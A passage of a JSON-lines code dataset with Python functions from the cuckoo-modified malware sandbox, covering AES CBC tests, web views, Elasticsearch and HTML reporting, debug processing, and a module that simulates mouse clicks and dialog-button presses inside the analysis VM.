"spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "#Self test\n", "func_signal": "def test_mode(self):\n", "code": "import key_expander\nimport aes_cipher\nimport test_keys\n\ntest_data = test_keys.TestKeys()\n\ntest_expander = key_expander.KeyExpander(256)\ntest_expanded_key = test_expander.expand(test_data.test_mode_key)\n\ntest_cipher = aes_cipher.AESCipher(test_expanded_key)\n\ntest_cbc = CBCMode(test_cipher, 16)\n\ntest_cbc.set_iv(test_data.test_mode_iv)\nfor k in range(4):\n    self.assertEquals(len([i for i, j in zip(test_data.test_cbc_ciphertext[k],test_cbc.encrypt_block(test_data.test_mode_plaintext[k])) if i == j]),\n        16,\n        msg='CBC encrypt test block %d'%k)\n\ntest_cbc.set_iv(test_data.test_mode_iv)\nfor k in range(4):\n    self.assertEquals(len([i for i, j in zip(test_data.test_mode_plaintext[k],test_cbc.decrypt_block(test_data.test_cbc_ciphertext[k])) if i == j]),\n        16,\n        msg='CBC decrypt test block %d'%k)", "path": "lib\\cuckoo\\common\\peepdf\\aespython\\cbc_mode.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "\"\"\"Filters calls for call category.\n@param task_id: cuckoo task id\n@param pid: pid you want calls\n@param category: call category type\n@param apilist: comma-separated list of APIs to include, if preceded by ! specifies to exclude the list\n\"\"\"\n", "func_signal": "def filtered_chunk(request, task_id, pid, category, apilist):\n", "code": "if request.is_ajax():\n    # Search calls related to your PID.\n    if enabledconf[\"mongodb\"]:\n        record = results_db.analysis.find_one(\n            {\"info.id\": int(task_id), \"behavior.processes.process_id\": int(pid)},\n            {\"behavior.processes.process_id\": 1, \"behavior.processes.calls\": 1}\n        )\n    if es_as_db:\n        #print \"info.id: \\\"%s\\\" and behavior.processes.process_id: \\\"%s\\\"\" % (task_id, pid)\n        record = es.search(\n                     index=fullidx,\n                     doc_type=\"analysis\",\n                     q=\"info.id: \\\"%s\\\" and behavior.processes.process_id: \\\"%s\\\"\" % (task_id, pid),\n                 )['hits']['hits'][0]['_source']\n\n    if not record:\n        raise PermissionDenied\n\n    # Extract embedded document related to your process from response collection.\n    process = None\n    for pdict in record[\"behavior\"][\"processes\"]:\n        if pdict[\"process_id\"] == int(pid):\n            process = pdict\n\n    if not process:\n        raise PermissionDenied\n\n    # Create empty process dict for AJAX view.\n    filtered_process = {\"process_id\": pid, \"calls\": []}\n\n    exclude = False\n    apilist = apilist.strip()\n    if len(apilist) and apilist[0] == '!':\n        exclude = True\n    apilist = apilist.lstrip('!')\n    apis = apilist.split(',')\n    apis[:] = [s.strip().lower() for s in apis if len(s.strip())]\n\n    # Populate dict, fetching data from all calls and selecting only appropriate category/APIs.\n    for call in process[\"calls\"]:\n        if enabledconf[\"mongodb\"]:\n            chunk = results_db.calls.find_one({\"_id\": call})\n        if es_as_db:\n            chunk = es.search(\n                        index=fullidx,\n                        doc_type=\"calls\",\n                        q=\"_id: \\\"%s\\\"\" % call,\n                    )['hits']['hits'][0]['_source']\n        for call in chunk[\"calls\"]:\n            if category == \"all\" or call[\"category\"] == category:\n                if len(apis) > 0:\n                    add_call = -1\n                    for api in apis:\n                        if call[\"api\"].lower() == api:\n                            if exclude == True:\n                                add_call = 0\n                            else:\n                                add_call = 1\n                            break\n                    if (exclude == True and add_call != 0) or (exclude == False and add_call == 1):\n                        filtered_process[\"calls\"].append(call)\n                else:\n                    filtered_process[\"calls\"].append(call)\n\n    return render(request, \"analysis/behavior/_chunk.html\",\n                              {\"chunk\": filtered_process})\nelse:\n    raise PermissionDenied", "path": "web\\analysis\\views.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "\"\"\"Writes report.\n@param results: analysis results dictionary.\n@raise CuckooReportError: if fails to connect or write to Elasticsearch.\n\"\"\"\n# We put the raise here and not at the import because it would\n# otherwise trigger even if the module is not enabled in the config.\n", "func_signal": "def run(self, results):\n", "code": "if not HAVE_ELASTICSEARCH:\n    raise CuckooDependencyError(\"Unable to import elasticsearch \"\n                                \"(install with `pip install elasticsearch`)\")\n\nself.connect()\nindex_prefix  = self.options.get(\"index\", \"cuckoo\")\nsearch_only   = self.options.get(\"searchonly\", False)\n\n# Create a copy of the dictionary. This is done in order to not modify\n# the original dictionary and possibly compromise the following\n# reporting modules.\nreport = dict(results)\n\nidxdate = report[\"info\"][\"started\"].split(\" \")[0]\nself.index_name = '{0}-{1}'.format(index_prefix, idxdate)\n\nif not search_only:\n    if not \"network\" in report:\n        report[\"network\"] = {}\n\n    # Store API calls in chunks for pagination in Django\n    if \"behavior\" in report and \"processes\" in report[\"behavior\"]:\n        new_processes = []\n        for process in report[\"behavior\"][\"processes\"]:\n            new_process = dict(process)\n            chunk = []\n            chunks_ids = []\n            # Loop on each process call.\n            for index, call in enumerate(process[\"calls\"]):\n                # If the chunk size is 100 or if the loop is completed then\n                # store the chunk in Elastcisearch.\n                if len(chunk) == 100:\n                    to_insert = {\"pid\": process[\"process_id\"],\n                                 \"calls\": chunk}\n                    pchunk = self.es.index(index=self.index_name,\n                                           doc_type=\"calls\", body=to_insert)\n                    chunk_id = pchunk['_id']\n                    chunks_ids.append(chunk_id)\n                    # Reset the chunk.\n                    chunk = []\n\n                # Append call to the chunk.\n                chunk.append(call)\n\n            # Store leftovers.\n            if chunk:\n                to_insert = {\"pid\": process[\"process_id\"], \"calls\": chunk}\n                pchunk = self.es.index(index=self.index_name, \n                                       doc_type=\"calls\", body=to_insert)\n                chunk_id = pchunk['_id']\n                chunks_ids.append(chunk_id)\n\n            # Add list of chunks.\n            new_process[\"calls\"] = chunks_ids\n            new_processes.append(new_process)\n\n        # Store the results in the report.\n        report[\"behavior\"] = dict(report[\"behavior\"])\n        report[\"behavior\"][\"processes\"] = new_processes\n\n    # Add screenshot paths\n    report[\"shots\"] = []\n    shots_path = os.path.join(self.analysis_path, \"shots\")\n    if os.path.exists(shots_path):\n        shots = [shot for shot in os.listdir(shots_path)\n                 if shot.endswith(\".jpg\")]\n        for shot_file in sorted(shots):\n            shot_path = os.path.join(self.analysis_path, \"shots\",\n                                     shot_file)\n            screenshot = File(shot_path)\n            if screenshot.valid():\n                # Strip the extension as it's added later \n                # in the Django view\n                report[\"shots\"].append(shot_file.replace(\".jpg\", \"\"))\n\n    if results.has_key(\"suricata\") and results[\"suricata\"]:\n        if results[\"suricata\"].has_key(\"tls\") and len(results[\"suricata\"][\"tls\"]) > 0:\n            report[\"suri_tls_cnt\"] = len(results[\"suricata\"][\"tls\"])\n        if results[\"suricata\"] and results[\"suricata\"].has_key(\"alerts\") and len(results[\"suricata\"][\"alerts\"]) > 0:\n            report[\"suri_alert_cnt\"] = len(results[\"suricata\"][\"alerts\"])\n        if results[\"suricata\"].has_key(\"files\") and len(results[\"suricata\"][\"files\"]) > 0:\n            report[\"suri_file_cnt\"] = len(results[\"suricata\"][\"files\"])\n        if results[\"suricata\"].has_key(\"http\") and len(results[\"suricata\"][\"http\"]) > 0:\n            report[\"suri_http_cnt\"] = len(results[\"suricata\"][\"http\"])\nelse:\n    report = {}\n    report[\"task_id\"] = results[\"info\"][\"id\"]\n    report[\"info\"]    = results.get(\"info\")\n    report[\"target\"]  = results.get(\"target\")\n    report[\"summary\"] = results.get(\"behavior\", {}).get(\"summary\")\n    report[\"network\"] = results.get(\"network\")\n    report[\"virustotal\"] = results.get(\"virustotal\")\n\n# Other info we want Quick access to from the web UI\nif results.has_key(\"virustotal\") and results[\"virustotal\"] and results[\"virustotal\"].has_key(\"positives\") and results[\"virustotal\"].has_key(\"total\"):\n    report[\"virustotal_summary\"] = \"%s/%s\" % (results[\"virustotal\"][\"positives\"],results[\"virustotal\"][\"total\"])\n\n# Store the report and retrieve its object id.\nself.es.index(index=self.index_name, doc_type=\"analysis\", id=results[\"info\"][\"id\"], body=report)", "path": "modules\\reporting\\elasticsearchdb.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "# List of buttons labels to click.\n", "func_signal": "def foreach_child(hwnd, lparam):\n", "code": "buttons = [\n    # english\n    \"yes\",\n    \"ok\",\n    \"accept\",\n    \"next\",\n    \"install\",\n    \"run\",\n    \"agree\",\n    \"enable\",\n    \"don't send\",\n    \"don't save\",\n    \"continue\",\n    \"unzip\",\n    \"open\",\n    \"close the program\",\n    \"save\",\n    \"later\",\n    \"finish\",\n    \"end\",\n    \"allow access\",\n    \"remind me later\",\n    # german\n    \"ja\",\n    \"weiter\",\n    \"akzeptieren\",\n    \"ende\",\n    \"starten\",\n    \"jetzt starten\",\n    \"neustarten\",\n    \"neu starten\",\n    \"jetzt neu starten\",\n    \"beenden\",\n    \"oeffnen\",\n    \"schliessen\",\n    \"installation weiterfuhren\",\n    \"fertig\",\n    \"beenden\",\n    \"fortsetzen\",\n    \"fortfahren\",\n    \"stimme zu\",\n    \"zustimmen\",\n    \"senden\",\n    \"nicht senden\",\n    \"speichern\",\n    \"nicht speichern\",\n    \"ausfuehren\",\n    \"spaeter\",\n    \"einverstanden\"\n]\n\n# List of buttons labels to not click.\ndontclick = [\n    # english\n    \"check online for a solution\",\n    \"don't run\",\n    \"do not ask again until the next update is available\",\n    \"cancel\",\n    \"do not accept the agreement\",\n    \"i would like to help make reader even better\",\n    # german\n    \"abbrechen\",\n    \"online nach losung suchen\",\n    \"abbruch\",\n    \"nicht ausfuehren\",\n    \"hilfe\",\n    \"stimme nicht zu\"\n]\n\nclassname = create_unicode_buffer(128)\nUSER32.GetClassNameW(hwnd, classname, 128)\n\n# Check if the class of the child is button.\nif \"button\" in classname.value.lower() or classname.value == \"NUIDialog\" or classname.value == \"bosa_sdm_msword\":\n    # Get the text of the button.\n    length = USER32.SendMessageW(hwnd, WM_GETTEXTLENGTH, 0, 0)\n    if not length:\n        return True\n    text = create_unicode_buffer(length + 1)\n    USER32.SendMessageW(hwnd, WM_GETTEXT, length + 1, text)\n    textval = text.value.replace('&','')\n    if \"Microsoft\" in textval and (classname.value == \"NUIDialog\" or classname.value == \"bosa_sdm_msword\"):\n        log.info(\"Issuing keypress on Office dialog\")\n        USER32.SetForegroundWindow(hwnd)\n        # enter key down/up\n        USER32.keybd_event(0x0d, 0x1c, 0, 0)\n        USER32.keybd_event(0x0d, 0x1c, 2, 0)\n        return False\n\n    # we don't want to bother clicking any non-visible child elements, as they\n    # generally won't respond and will cause us to fixate on them for the\n    # rest of the analysis, preventing progress with visible elements\n\n    if not USER32.IsWindowVisible(hwnd):\n        return True\n\n    # Check if the button is set as \"clickable\" and click it.\n    for button in buttons:\n        if button in textval.lower():\n            dontclickb = False\n            for btn in dontclick:\n                if btn in textval.lower():\n                    dontclickb = True\n            if not dontclickb:\n                log.info(\"Found button \\\"%s\\\", clicking it\" % text.value)\n                USER32.SetForegroundWindow(hwnd)\n                KERNEL32.Sleep(1000)\n                USER32.SendMessageW(hwnd, BM_CLICK, 0, 0)\n                # only stop searching when we click a button\n                return False\nreturn True", "path": "analyzer\\windows\\modules\\auxiliary\\human.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "\"\"\"Run debug analysis.\n@return: debug information dict.\n\"\"\"\n", "func_signal": "def run(self):\n", "code": "self.key = \"debug\"\ndebug = {\"log\": \"\", \"errors\": []}\n\nif os.path.exists(self.log_path):\n    try:\n        debug[\"log\"] = codecs.open(self.log_path, \"rb\", \"utf-8\").read()\n    except ValueError as e:\n        raise CuckooProcessingError(\"Error decoding %s: %s\" %\n                                    (self.log_path, e))\n    except (IOError, OSError) as e:\n        raise CuckooProcessingError(\"Error opening %s: %s\" %\n                                    (self.log_path, e))\n\nfor error in Database().view_errors(int(self.task[\"id\"])):\n    debug[\"errors\"].append(error.message)\n\nreturn debug", "path": "modules\\processing\\debug.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "# Move mouse to top-middle position.\n", "func_signal": "def click_mouse():\n", "code": "USER32.SetCursorPos(RESOLUTION[\"x\"] / 2, 0)\n# Mouse down.\nUSER32.mouse_event(2, 0, 0, 0, None)\nKERNEL32.Sleep(50)\n# Mouse up.\nUSER32.mouse_event(4, 0, 0, 0, None)", "path": "analyzer\\windows\\modules\\auxiliary\\human.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "\"\"\"Writes report.\n@param results: Cuckoo results dict.\n@raise CuckooReportError: if fails to write report.\n\"\"\"\n", "func_signal": "def run(self, results):\n", "code": "if not HAVE_JINJA2:\n    raise CuckooReportError(\"Failed to generate HTML report: \"\n                            \"Jinja2 Python library is not installed\")\n\nshots_path = os.path.join(self.analysis_path, \"shots\")\nif os.path.exists(shots_path):\n    shots = []\n    counter = 1\n    for shot_name in os.listdir(shots_path):\n        if not shot_name.endswith(\".jpg\"):\n            continue\n\n        shot_path = os.path.join(shots_path, shot_name)\n\n        if os.path.getsize(shot_path) == 0:\n            continue\n\n        shot = {}\n        shot[\"id\"] = os.path.splitext(File(shot_path).get_name())[0]\n        shot[\"data\"] = base64.b64encode(open(shot_path, \"rb\").read())\n        shots.append(shot)\n\n        counter += 1\n\n    shots.sort(key=lambda shot: shot[\"id\"])\n    results[\"shots\"] = shots\nelse:\n    results[\"shots\"] = []\n\nenv = Environment(autoescape=True)\nenv.loader = FileSystemLoader(os.path.join(CUCKOO_ROOT,\n                                           \"data\", \"html\"))\n\ntry:\n    tpl = env.get_template(\"report.html\")\n    html = tpl.render({\"results\": results, \"summary_report\" : False})\nexcept UndefinedError as e:\n    raise CuckooReportError(\"Failed to generate summary HTML report: {} \".format(e))\nexcept TemplateNotFound as e:\n    raise CuckooReportError(\"Failed to generate summary HTML report: {} {} \".format(e, e.name))\nexcept (TemplateSyntaxError, TemplateAssertionError) as e:\n    raise CuckooReportError(\"Failed to generate summary HTML report: {} on {}, line {} \".format(e, e.name,\n                                                                                                e.lineno))\ntry:\n    with codecs.open(os.path.join(self.reports_path, \"report.html\"), \"w\", encoding=\"utf-8\") as report:\n        report.write(html)\nexcept (TypeError, IOError) as e:\n    raise CuckooReportError(\"Failed to write HTML report: %s\" % e)\n\nreturn True", "path": "modules\\reporting\\reporthtml.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "\"\"\"Creates a single ProcessTreeNode corresponding to a single node in the tree observed cuckoo.\n@param process: process from cuckoo dict.\n\"\"\"\n", "func_signal": "def createProcessTreeNode(process):\n", "code": "process_node_dict = {\"pid\" : process[\"pid\"],\n                     \"name\" : process[\"name\"],\n                     \"spawned_processes\" : [createProcessTreeNode(child_process) for child_process in process[\"children\"]]\n                    }\nreturn process_node_dict", "path": "web\\api\\views.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
{"docstring": "# If the window is visible, enumerate its child objects, looking\n# for buttons.\n", "func_signal": "def foreach_window(hwnd, lparam):\n", "code": "if USER32.IsWindowVisible(hwnd):\n    # we also want to inspect the \"parent\" windows, not just the children\n    foreach_child(hwnd, lparam)\n    USER32.EnumChildWindows(hwnd, EnumChildProc(foreach_child), 0)\nreturn True", "path": "analyzer\\windows\\modules\\auxiliary\\human.py", "repo_name": "spender-sandbox/cuckoo-modified", "stars": 384, "license": "None", "language": "python", "size": 39918}
